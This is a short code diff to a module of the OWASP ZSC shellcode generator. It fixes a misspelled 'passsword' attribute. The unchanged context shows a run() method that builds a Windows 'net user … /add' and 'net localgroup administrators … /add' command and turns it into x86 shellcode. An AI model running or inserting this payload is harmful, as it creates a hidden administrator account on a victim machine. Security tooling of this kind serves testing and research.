@@ -1,4 +1,3 @@
-
 """
 OWASP ZSC
 https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
@@ -14,7 +13,7 @@ from cores import stack
 
 class Module(base_module.BaseModule):
     username = base_module.OptString("", "Username")
-    passsword = base_module.OptString("", "Password")
+    password = base_module.OptString("", "Password")
 
     def generate(self, command, cvtcommand):
         payload = "xor    %ecx,%ecx"
@@ -91,7 +90,7 @@ class Module(base_module.BaseModule):
         return payload
 
     def run(self):
-        command = f"cmd.exe /c net user {self.username} {self.passsword} /add && " \
+        command = f"cmd.exe /c net user {self.username} {self.password} /add && " \
                   f"net localgroup administrators {self.username} /add "
         print(self.generate(
             stack.generate(command, "%ecx", "string"),
